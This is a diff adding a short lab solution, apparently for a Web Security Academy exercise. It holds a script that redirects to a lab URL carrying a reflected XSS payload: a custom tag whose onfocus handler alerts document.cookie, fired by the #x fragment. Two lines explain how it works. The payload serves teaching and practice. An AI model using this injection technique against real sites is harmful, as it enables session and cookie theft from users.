@@ -1,0 +1,7 @@
+<script>
+location = 'https://aced1fcf1e63822380d71246004400cf.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
+</script> 
+
+This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. 
+
+The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called. 
